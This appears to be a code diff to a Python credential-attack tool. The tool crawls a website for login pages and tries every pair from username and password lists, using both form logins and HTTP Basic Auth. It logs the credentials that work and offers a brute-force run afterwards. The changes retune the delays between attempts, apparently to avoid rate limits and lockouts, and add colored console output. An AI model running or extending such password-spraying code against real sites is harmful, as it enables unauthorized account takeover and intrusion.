@@ -322,7 +322,7 @@ def attempt_login_with_form(full_url, session, username, password):
 # Function to ask the user if they want to attempt bruteforce
 def ask_for_bruteforce():
     while True:
-        user_input = input("All combinations tried. Do you want to perform bruteforce attack? (yes/no): ").lower()
+        user_input = input(f"{Fore.YELLOW}All combinations tried. Do you want to perform bruteforce attack? (yes/no): ").lower()
         if user_input in ['yes', 'no']:
             return user_input == 'yes'
         print("Invalid input. Please type 'yes' or 'no'.")
@@ -419,7 +419,6 @@ def perform_bruteforce(username_file, password_file, ip_address, criteria, sessi
 
 # Modify the password_spraying function to include bruteforce and character substitution
 def password_spraying(ip_address, username_file, password_file, criteria):
-    time.sleep(2)
     successful_cracks = []
     failed_cracks = []
 
@@ -455,14 +454,14 @@ def password_spraying(ip_address, username_file, password_file, criteria):
     pages_to_check = traverse_website(base_url, session)
 
     for page in pages_to_check:
-        time.sleep(2)
+        time.sleep(5)
         full_url = urljoin(base_url, page)
 
         # Check if the page has a password field (form-based authentication)
         if is_password_requested_basic_password_field(full_url, session):
             for password in passwords:
                 for username in usernames:
-                    time.sleep(2)
+                    time.sleep(5)
                     try:
                         print(f"{Fore.WHITE}Trying username: {username} and password: {password}")
                         credentials = attempt_login_with_form(full_url, session, username, password)
@@ -472,7 +471,6 @@ def password_spraying(ip_address, username_file, password_file, criteria):
                             successful_cracks.append((full_url, credentials[0], credentials[1]))
                         else:
                             failed_cracks.append((full_url, username, password))
-                        time.sleep(10)
                     except (Timeout, ConnectionError):
                         print(f"Connection failed for {full_url}")
                     except RequestException as e:
@@ -481,6 +479,7 @@ def password_spraying(ip_address, username_file, password_file, criteria):
         if is_password_requested_basic_auth(full_url, session):
             for password in passwords:
                 for username in usernames:
+                    time.sleep(5)
                     try:
                         print(f"{Fore.WHITE}Trying BasicAuth with username: {username} and password: {password}")
                         response = session.get(full_url, auth=HTTPBasicAuth(username, password))
@@ -498,18 +497,16 @@ def password_spraying(ip_address, username_file, password_file, criteria):
                                 print(f"{Fore.RED}Failed! BasicAuth with Username: {username}, Password: {password} on {full_url} Reason: {response.reason}")
                     
                             failed_cracks.append((full_url, username, password))
-                        time.sleep(10)
 
                     except (Timeout, ConnectionError):
                         print(f"Connection failed for {full_url}")
                     except RequestException as e:
                         print(f"An error occurred: {e}")
-
     # After exhausting all combinations, ask if the user wants to proceed with bruteforce
     if ask_for_bruteforce():
         perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check)
     
-    print("\n--- Summary of Cracking Attempts ---")
+    print(f"{Fore.WHITE}\n--- Summary of Cracking Attempts ---")
     if successful_cracks:
         print(f"{Fore.GREEN}Successfully cracked pages:")
         for page, user, pwd in successful_cracks:
